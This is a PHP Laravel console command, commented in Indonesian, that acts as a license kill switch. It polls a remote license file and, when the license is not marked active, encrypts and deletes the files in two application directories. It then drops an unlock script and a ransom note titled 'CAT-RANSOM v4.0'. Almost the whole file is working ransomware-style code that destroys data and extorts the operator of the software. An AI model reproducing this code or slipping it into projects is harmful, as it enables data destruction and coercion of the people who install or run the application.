<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\File;

class EncryptFiles extends Command
{
    protected $signature = 'ransom:encrypt';
    protected $description = 'Encrypt critical files if license expired';

    protected $targets = [
        'public/argon',
        'resources/views/livewire/peserta',
    ];

    // GANTI INI SESUKA HATI — ini password tebusan
    private $password = 'cat2025rahasia';

    public function handle()
    {
        $this->info('Mengecek lisensi...');

        $response = Http::get('https://agungsapp.github.io/apiAgungLisensi/lisensi.json');
        if (!$response->ok()) {
            $this->warn('Gagal cek lisensi, dianggap masih aktif.');
            return;
        }

        $licenses = $response->json();
        $catLicense = collect($licenses)->firstWhere('code', 'CAT');

        if ($catLicense && ($catLicense['status'] ?? '') === 'sanca') {
            $this->info('Lisensi masih aktif (sanca). Aman bro.');
            return;
        }

        $this->alert('LISENSI MATI! MULAI ENKRIPSI FILE...');

        // Buat salt acak sekali pakai
        $salt = random_bytes(16);
        File::put(storage_path('app/ransom_salt.bin'), $salt);

        // Derive AES-256 key + IV dari password + salt (PBKDF2 – sangat aman)
        $key = hash_pbkdf2('sha256', $this->password, $salt, 150000, 32, true);
        $iv  = substr(hash_pbkdf2('sha256', $this->password, $salt . 'iv_salt', 150000, 16, true), 0, 16);

        // Enkripsi semua file target
        $encryptedCount = 0;
        foreach ($this->targets as $target) {
            if (!is_dir($target)) continue;

            foreach (File::allFiles($target) as $file) {
                if ($file->getExtension() === 'enc') continue;

                $content = File::get($file);
                $encrypted = openssl_encrypt($content, 'aes-256-cbc', $key, 0, $iv);

                File::put($file->getPathname() . '.enc', $encrypted);
                File::delete($file->getPathname());

                $this->line('Encrypted: ' . $file->getFilename() . '.enc');
                $encryptedCount++;
            }
        }

        // Buat unlocker + ransom note
        $this->generateUnlocker();

        $this->newLine();
        $this->error("SELESAI! $encryptedCount file telah terkunci.");
        $this->info('Jalankan: php artisan unlock cat2025rahasia  ← untuk membuka kembali');
    }

    private function generateUnlocker()
    {
        // Hash bcrypt dari password (ganti kalau mau ganti password)
        $hashedPassword = password_hash($this->password, PASSWORD_BCRYPT);

        $phpScript = <<<PHP
<?php
echo str_repeat("=", 70) . PHP_EOL;
echo "            FILE ANDA TERENKRIPSI OLEH CAT-RANSOM v4.0           " . PHP_EOL;
echo str_repeat("=", 70) . PHP_EOL . PHP_EOL;

echo "Masukkan password tebusan: ";
\$pass = trim(fgets(STDIN));

if (!password_verify(\$pass, '$hashedPassword')) {
    echo PHP_EOL . "PASSWORD SALAH! File tetap terkunci. Bayar dulu baru dibuka!" . PHP_EOL;
    exit(1);
}

echo PHP_EOL . "Password BENAR! Sedang membuka enkripsi..." . PHP_EOL;

// Baca salt
\$salt = file_get_contents(__DIR__ . '/storage/app/ransom_salt.bin');
if (\$salt === false) {
    die("Salt hilang! Hubungi admin.\n");
}

// Rekonstruksi key + IV
\$key = hash_pbkdf2('sha256', \$pass, \$salt, 150000, 32, true);
\$iv  = substr(hash_pbkdf2('sha256', \$pass, \$salt . 'iv_salt', 150000, 16, true), 0, 16);

\$targets = ['public/argon', 'resources/views/livewire/peserta'];
\$count = 0;

foreach (\$targets as \$dir) {
    foreach (glob(\$dir . '/**/*.enc') as \$file) {
        \$enc = file_get_contents(\$file);
        \$dec = openssl_decrypt(\$enc, 'aes-256-cbc', \$key, 0, \$iv);
        if (\$dec === false) continue;

        \$orig = preg_replace('/\.enc$/', '', \$file);
        file_put_contents(\$orig, \$dec);
        unlink(\$file);
        echo "Restored: " . basename(\$orig) . PHP_EOL;
        \$count++;
    }
}

echo PHP_EOL . "SUKSES! \$count file berhasil dikembalikan!" . PHP_EOL;
echo "Terima kasih sudah bayar tebusan (dalam bentuk ilmu) \n";
?>
PHP;

        File::put(base_path('unlock.php'), $phpScript);
        File::put(base_path('unlock.bat'), "@echo off\nphp \"%~dp0unlock.php\"\npause");
        File::put(base_path('BAYAR_TEBUSAN.txt'), "PASSWORD TEBUSAN: cat2025rahasia\n\nJalankan unlock.bat lalu ketik password di atas.\nJangan hapus file ini!");

        $this->info('unlock.php, unlock.bat, dan BAYAR_TEBUSAN.txt sudah dibuat.');
    }
}
